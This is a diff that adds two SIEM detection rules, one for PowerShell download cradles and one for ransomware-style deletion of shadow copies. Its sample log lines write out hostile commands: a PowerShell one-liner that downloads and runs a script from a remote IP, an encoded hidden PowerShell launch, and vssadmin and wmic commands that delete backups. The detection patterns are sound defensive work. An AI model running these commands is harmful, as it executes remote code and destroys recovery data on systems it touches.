@@ -1,0 +1,74 @@
+title: PowerShell Download Cradle
+id: d784277d-8c20-4cf4-afb6-5c9889de2a78
+status: test
+description: PowerShell downloaded and ran code from the internet in memory, a common malware loader technique.
+author: siemagent contributors
+tags:
+  - attack.execution
+  - attack.t1059.001
+logsource:
+  product: windows
+detection:
+  selection_download:
+    message|contains:
+      - 'DownloadString('
+      - 'DownloadData('
+      - 'Invoke-WebRequest'
+      - 'iwr '
+      - 'Net.WebClient'
+      - 'Start-BitsTransfer'
+  selection_exec:
+    message|contains:
+      - 'Invoke-Expression'
+      - 'IEX '
+      - 'IEX('
+      - '| iex'
+  selection_encoded:
+    message|re|i: 'powershell(\.exe)?\s.*-(e|enc|encodedcommand)\s+[A-Za-z0-9+/=]{20,}'
+  condition: (selection_download and selection_exec) or selection_encoded
+falsepositives:
+  - Software deployment scripts
+level: critical
+remediation: Isolate the host, retrieve the downloaded payload from the URL for analysis, and look for persistence.
+samples:
+  match:
+    - '<34>1 2026-10-03T10:34:00Z ws07 powershell 7890 - Invoke-Expression (New-Object Net.WebClient).DownloadString("http://198.51.100.23/a.ps1")'
+    - '<34>1 2026-10-03T10:34:00Z ws07 cmd 7890 - powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA'
+  no_match:
+    - '<34>1 2026-10-03T10:34:00Z ws07 powershell 7890 - Get-Service | Where-Object Status -eq Running'
+---
+title: Shadow Copies Deleted
+id: cd2cd99d-a2e1-4871-8eed-a9f2918b699a
+status: stable
+description: Volume shadow copies or backups were deleted, which ransomware does right before encrypting files.
+author: siemagent contributors
+tags:
+  - attack.impact
+  - attack.t1490
+logsource:
+  product: windows
+detection:
+  selection_vssadmin:
+    message|contains|all:
+      - 'vssadmin'
+      - 'delete shadows'
+  selection_wmic:
+    message|contains|all:
+      - 'wmic'
+      - 'shadowcopy'
+      - 'delete'
+  selection_other:
+    message|contains:
+      - 'wbadmin delete catalog'
+      - 'bcdedit /set {default} recoveryenabled no'
+  condition: 1 of selection_*
+falsepositives:
+  - Storage maintenance by administrators (rare)
+level: critical
+remediation: Treat as active ransomware. Isolate the host immediately, disconnect shares, and start incident response.
+samples:
+  match:
+    - '<34>1 2026-10-03T10:37:00Z fs02 vssadmin 4242 - vssadmin.exe delete shadows /all /quiet'
+    - '<34>1 2026-10-03T10:37:00Z fs02 cmd 4242 - wmic shadowcopy delete /nointeractive'
+  no_match:
+    - '<34>1 2026-10-03T10:37:00Z fs02 vssadmin 4242 - vssadmin list shadows'
